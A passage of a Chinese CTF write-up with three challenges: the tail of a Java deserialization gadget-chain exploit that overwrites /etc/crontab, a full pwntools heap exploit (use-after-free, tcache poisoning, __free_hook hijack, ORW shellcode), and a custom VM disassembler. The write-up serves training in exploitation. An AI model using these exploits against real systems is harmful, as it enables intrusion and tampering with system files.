#aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
        },
        "charsetName": "UTF-8",
        "bufferSize": 1024
      },
      "branch": {
        "@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.output.WriterOutputStream",
        "writer": {
          "@type": "org.apache.commons.io.output.FileWriterWithEncoding",
          "file": "/etc/crontab",
          "encoding": "UTF-8",
          "append": false
        },
        "charsetName": "UTF-8",
        "bufferSize": 1024,
        "writeImmediately": true
      },
      "trigger": {
        "@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.XmlStreamReader",
        "is": {
          "@type": "org.apache.commons.io.input.TeeInputStream",
          "input": {
            "$ref": "$.input"
          },
          "branch": {
            "$ref": "$.branch"
          },
          "closeBranch": true
        },
        "httpContentType": "text/xml",
        "lenient": false,
        "defaultEncoding": "UTF-8"
      },
      "trigger2": {
        "@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.XmlStreamReader",
        "is": {
          "@type": "org.apache.commons.io.input.TeeInputStream",
          "input": {
            "$ref": "$.input"
          },
          "branch": {
            "$ref": "$.branch"
          },
          "closeBranch": true
        },
        "httpContentType": "text/xml",
        "lenient": false,
        "defaultEncoding": "UTF-8"
      },
      "trigger3": {
        "@type": "java.lang.AutoCloseable",
        "@type": "org.apache.commons.io.input.XmlStreamReader",
        "is": {
          "@type": "org.apache.commons.io.input.TeeInputStream",
          "input": {
            "$ref": "$.input"
          },
          "branch": {
            "$ref": "$.branch"
          },
          "closeBranch": true
        },
        "httpContentType": "text/xml",
        "lenient": false,
        "defaultEncoding": "UTF-8"
      }
    }
  }
}
'''
    res = requests.post(exp_url, headers=exp_headers, data=exp_data)
    print(res.text)

if __name__ == '__main__':
    try:
        exp(HOST, PORT)
    except Exception as e:
        print('Demo: check.py 127.0.0.1 8083')
```

# PWN
## 题目-rcms
### 题目信息
| 题目名 | 类型 | 难度 |
| --- | --- | --- |
| rcms | Pwn | 困难 |


### FLAG
+ 动态flag

### 知识点
1. uaf
2. Pie保护的绕过
3. Teachbin attack
4. orw构造
5. 沙箱绕过

### 解题步骤
#### 1.检查题目保护机制
<img src="https://c.img.dasctf.com/images/2024130/1706608251351-8ef9c44b-a5ff-429e-b250-385c9814656b.png" width="1058" title="null" crop="0,0,1,1" id="veioY" class="ne-image">

保护机制全开；

#### 2.ida分析
主函数：

<img src="https://c.img.dasctf.com/LightPicture/2024/04/ea21aeadd4f2f013.png" width="1142" title="null" crop="0,0,1,1" id="omurn" class="ne-image">

这里存在四个功能，并且该程序还开启了沙箱功能，防止直接拿shell；

这里申请了一个堆块，并且将gift函数的地址写了进去，是为了提示泄漏elf地址；

Creat_c函数中：

<img src="https://c.img.dasctf.com/images/2024130/1706618433907-05b52ef7-a9b7-4993-b293-4d9ac19a68e9.png" width="914" title="null" crop="0,0,1,1" id="eJ2GU" class="ne-image">

限制申请0x430大小的堆块，并且最多申请20个堆块，不存在漏洞点；

delet函数：

<img src="https://c.img.dasctf.com/images/2024130/1706618449334-cd29c6c0-71f8-4acf-b898-1f5ff42e29e1.png" width="828" title="null" crop="0,0,1,1" id="gsjDC" class="ne-image">

这里存在uaf漏洞；

change函数：<img src="https://c.img.dasctf.com/images/2024130/1706618465647-db7c4b3f-644f-4ddb-81b2-51db00b198d6.png" width="898" title="null" crop="0,0,1,1" id="fzpgL" class="ne-image">

不存在漏洞，只能正常的输入内容；

show函数：

<img src="https://c.img.dasctf.com/images/2024130/1706618483738-d74bf07c-de0d-4fef-974d-04feeb53155e.png" width="840" title="null" crop="0,0,1,1" id="jpuHV" class="ne-image">

功能正常，可以用来泄漏libc地址；

gift函数：

<img src="https://c.img.dasctf.com/images/2024130/1706618499559-fd82205e-fda0-4562-b3a5-b2c81a1c5e17.png" width="756" title="null" crop="0,0,1,1" id="LFbcw" class="ne-image">

这里开辟了一页的内存空间，可以执行一段代码，但是在程序中并没有调用，我们可以利用栈溢出的思路来劫持返回地址到该函数或者也可以直接劫持____malloc_hook、____free_hook来调用gift函数；

**3.思路**

1.uaf泄漏libc地址；

2.泄漏堆地址，利用泄漏出来的堆地址计算出gift地址，绕过pie保护机制；

3.tcachebin attack修改fd指针，指向free_hook指针；

4.劫持__free_hook为gift；

5.调用delet函数时会执行gift函数；

6.构造row链，读出flag。

**4.exp分析**

1.uaf泄漏libc地址；

```python
from pwn import *
elf = ELF('./rcms')
#io = remote('192.168.0.105',9999)
io = process('./rcms')
libc = elf.libc
context(log_level='debug', os = 'linux', arch = 'amd64')

def choice(c):
    io.recvuntil('5.exit')
    io.sendline(str(c))

def add(index,size,cmd):
    choice(1)
    io.recvuntil(':')
    io.sendline(str(index))
    io.recvuntil(':')
    io.sendline(str(size))
    io.recvuntil(':')
    io.send(cmd)

def delet(index):
    choice(2)
    io.recvuntil(':')
    io.sendline(str(index))

def change(index,cmd):
    choice(3)
    io.recvuntil(':')
    io.sendline(str(index))
    io.recvuntil(':')
    io.send(cmd)

def show(index):
    choice(4)
    io.recvuntil(':')
    io.sendline(str(index))


add(0,0x420,'AA')
add(1,0x60,'BB')
add(2,0x60,'CC')
add(3,0x60,'DD')

delet(0)

add(4,0x420,'A')

show(4)
libc_addr = u64(io.recvuntil('\x7f').ljust(8,b'\x00')) >> 8
libc_base = libc_addr - 0x3ebc41
free_hook = libc_base + libc.sym['__free_hook']
success('libc_addr = '+hex(libc_addr))
success('libc_base = '+hex(libc_base))
success('free_hook = '+hex(free_hook))
```

2.泄漏堆地址，利用泄漏出来的堆地址计算出gift地址，绕过pie保护机制；

```python
delet(1)
delet(2)

show(2)

io.recvline()
heap_addr = u64(io.recv(6).ljust(8,b'\x00'))

success('heap_addr = '+hex(heap_addr))
target_addr = heap_addr - 0x1470
success('target_addr = '+hex(target_addr))
change(2,p64(target_addr))

add(5,0x60,'QQQ')

add(6,0x60,'\n')

show(6)

io.recvline()
elf_addr = u64(io.recv(6).ljust(8,b'\x00'))
success('elf_addr = '+hex(elf_addr))
gift_addr = elf_addr + 0xce
success('gift_addr = '+hex(gift_addr))
```

3.tcachebin attack修改fd指针，指向free_hook指针；

```python
delet(5)

change(5,p64(free_hook))
```

4.劫持__free_hook为gift；

```python
add(7,0x60,'A')
add(8,0x60,p64(gift_addr))
```

5.调用delet函数时会执行gift函数；

```python
delet(7)
```

<img src="https://c.img.dasctf.com/images/2024130/1706618977509-7c641d2a-bc52-4024-bf56-1d6bc81fbc34.png" width="856" title="null" crop="0,0,1,1" id="boGcZ" class="ne-image">

已经执行到gift函数；

6.构造row链，读出flag。

```python
io.recvuntil('?')

shellcode = '''
mov r15, 0x67616c662f2e
push r15
mov rdi, rsp
mov rsi, 0
mov rax, 2
syscall
mov r14, 3
mov rdi, r14
mov rsi, rsp
mov rdx, 0xff
mov rax, 0
syscall
mov rdi,1
mov rsi, rsp
mov rdx, 0x30
mov rax, 1
syscall
'''

io.sendline(asm(shellcode))

io.interactive()
```

<img src="https://c.img.dasctf.com/images/2024130/1706619027481-ba3ecff9-42f9-438c-a8fb-08a6516f3ca0.png" width="684" title="null" crop="0,0,1,1" id="uEo39" class="ne-image">

**5.完整exp**

```python
from pwn import *
elf = ELF('./rcms')
#io = remote('192.168.0.105',9999)
io = process('./rcms')
libc = elf.libc
context(log_level='debug', os = 'linux', arch = 'amd64')

def choice(c):
    io.recvuntil('5.exit')
    io.sendline(str(c))

def add(index,size,cmd):
    choice(1)
    io.recvuntil(':')
    io.sendline(str(index))
    io.recvuntil(':')
    io.sendline(str(size))
    io.recvuntil(':')
    io.send(cmd)

def delet(index):
    choice(2)
    io.recvuntil(':')
    io.sendline(str(index))

def change(index,cmd):
    choice(3)
    io.recvuntil(':')
    io.sendline(str(index))
    io.recvuntil(':')
    io.send(cmd)

def show(index):
    choice(4)
    io.recvuntil(':')
    io.sendline(str(index))


add(0,0x420,'AA')
add(1,0x60,'BB')
add(2,0x60,'CC')
add(3,0x60,'DD')

delet(0)

add(4,0x420,'A')

show(4)
libc_addr = u64(io.recvuntil('\x7f').ljust(8,b'\x00')) >> 8
libc_base = libc_addr - 0x3ebc41
free_hook = libc_base + libc.sym['__free_hook']
success('libc_addr = '+hex(libc_addr))
success('libc_base = '+hex(libc_base))
success('free_hook = '+hex(free_hook))

delet(1)
delet(2)

show(2)

io.recvline()
heap_addr = u64(io.recv(6).ljust(8,b'\x00'))

success('heap_addr = '+hex(heap_addr))
target_addr = heap_addr - 0x1470
success('target_addr = '+hex(target_addr))

change(2,p64(target_addr))

add(5,0x60,'QQQ')

add(6,0x60,'\n')

show(6)

io.recvline()
elf_addr = u64(io.recv(6).ljust(8,b'\x00'))
success('elf_addr = '+hex(elf_addr))
gift_addr = elf_addr + 0xce
success('gift_addr = '+hex(gift_addr))

delet(5)

change(5,p64(free_hook))

add(7,0x60,'A')
add(8,0x60,p64(gift_addr))

delet(7)


io.recvuntil('?')

shellcode = '''
mov r15, 0x67616c662f2e
push r15
mov rdi, rsp
mov rsi, 0
mov rax, 2
syscall
mov r14, 3
mov rdi, r14
mov rsi, rsp
mov rdx, 0xff
mov rax, 0
syscall
mov rdi,1
mov rsi, rsp
mov rdx, 0x30
mov rax, 1
syscall
'''

io.sendline(asm(shellcode))

io.interactive()
```

执行

```shell
python3 exp.py 127.0.0.1 9999 DASCTF{TEST_DASFLAG_N}
```

可以看到通过了测试：

<img src="https://c.img.dasctf.com/LightPicture/2025/03/69d0a49f34d950cd.png" width="1338" title="null" crop="0,0,1,1" id="RyzGU" class="ne-image">

## 题目-mvmp
### 题目信息
| 题目名 | 类型 | 难度 |
| --- | --- | --- |
| mvmp | PWN | 困难 |


### FLAG
+ 动态flag

### 知识点
1. vm
2. 栈溢出

### 解题步骤
<img src="https://c.img.dasctf.com/LightPicture/2024/10/48a324e7e8e6cedb.png" width="836" title="null" crop="0,0,1,1" id="JzSL1" class="ne-image">  
分析`sub_1248`函数，可以知道标识指令码的字节中，最低两位用来表示参数的类型  
0: 一个立即数   
1: 一个寄存器   
2: 两个寄存器   
3: 一个寄存器，一个立即数

<img src="https://c.img.dasctf.com/LightPicture/2024/10/e0bdc05376baecd6.png" width="421" title="null" crop="0,0,1,1" id="pmh3r" class="ne-image">  
根据`sub_249e`函数，分析得到程序根据参数类型不同会进入不同函数中进行选择指令执行  
分析这些根据指令码选择指令的函数总结出以下指令

```python
codes_0=["cmp","cmps","mov","xor","or","and","sal","sar",\
    "xchg","add","sub","ldrb","ldrw","ldrd","sdrb","sdrw","sdrd"]
# 用于数据传输与数据比较
codes_1=["push","pop","inc","dec","gsp","cst","rst"]
# inc与dec为自增与自减，gsp为获取sp值，其余为操作栈指令
codes_2=["jmp","je","jg","jl","jge","jle","jne","call"]
# 用于跳转，允许寄存器或偏移
codes_3=["scall","scalld","scalls","scalld","scallds",\
    "scalldd","scallsd","scalldsd","ret"] 
# 用于调用系统调用 与 返回
# scall类指令的参数为系统调用的编号，寄存器0~5表示参数
```

根据以上直接码写出反汇编脚本

```python
def arg0(data):
    count=int.from_bytes(data[:3],'big')
    return f"{count:x}h",data[3:]
    pass
def arg1(data):
    regnum=data[0]
    return f"r{regnum}",data[1:]
    pass
def arg2(data):
    regnum1=data[0]
    regnum2=data[1]
    return f"r{regnum1},r{regnum2}",data[2:]
    pass
def arg3(data):
    regnum1=data[0]
    count=int.from_bytes(data[1:5],'little')
    return f"r{regnum1},{count:x}h",data[5:]

args_handle=[arg0,arg1,arg2,arg3]

codes_0=["cmp","cmps","mov","xor","or","and","sal","sar","xchg","add","sub","ldrb","ldrw","ldrd","sdrb","sdrw","sdrd"]
codes_1=["push","pop","inc","dec","gsp","cst","rst"]
codes_2=["jmp","je","jg","jl","jge","jle","jne","call"]
codes_3=["scall","scalld","scalls","scalld","scallds","scalldd","scallsd","scalldsd","ret"]

def main():
    f=open("vmcode",'rb')
    start=int.from_bytes(f.read(4),'little')
    d=f.read()
    total=len(d)
    jmplist={}
    codes={}
    labeln=0
    funcn=0
    while (len(d)!=0):
        pc=total-len(d)
        inst=d[0]
        arg_n=inst&3
        inst=inst>>2
        args,d=args_handle[arg_n](d[1:])
        if (inst>0 and inst <= len(codes_0)):
            inst_sign=codes_0[inst-1]
            codes[pc]=(f"{inst_sign} {args}",None)
        elif (inst <= 30+len(codes_1)):
            inst_sign=codes_1[inst-31]
            codes[pc]=(f"{inst_sign} {args}",None)
            pass
        elif (inst <= 40+len(codes_2)):
            inst_sign=codes_2[inst-41]
            codes[pc]=(f"{inst_sign} {args}",None)
            if (arg_n==0):
                jmplist[pc]=(inst,int(args[:-1],16))
            pass
        elif (inst <= 50+len(codes_3)):
            inst_sign=codes_3[inst-51]
            codes[pc]=(f"{inst_sign} {args}",None)
            pass
    for i in jmplist:
        inst,offset=jmplist[i]
        from_=i+4
        if (offset&0x800000)!=0:
            to=from_-(offset&0x7fffff)
        else:
            to=from_+offset
        if (inst==48):
            label=f"func_{funcn}:"
            funcn+=1
        else:
            label=f"label_{labeln}"
            labeln+=1;
        codes[to]=(codes[to][0],label)
        inst_sign=codes_2[inst-41]
        codes[i]=(f"{inst_sign} {label}",codes[i][1])

    codes[start]=(codes[start][0],"start:")
    f=open("discode",'w')
    for i in codes:
        code,label=codes[i]
        if (label!=None):
            f.write(label+'\n')
        f.write(f"{i}: {code}\n")
    f.close()
main()
```

以下为运行结果

```javascript
start:
0: cst 8h
4: gsp r0
6: sdrd r0,74616857h
12: add r0,4h
18: sdrd r0,79207327h
24: add r0,4h
30: sdrd r0,2072756fh
36: add r0,4h
42: sdrd r0,656d616eh
48: add r0,4h
54: sdrw r0,a3fh
60: gsp r0
62: push r0
64: call func_0:
68: mov r2,r0
71: gsp r1
73: mov r0,1h
79: push r2
81: push r1
83: push r0
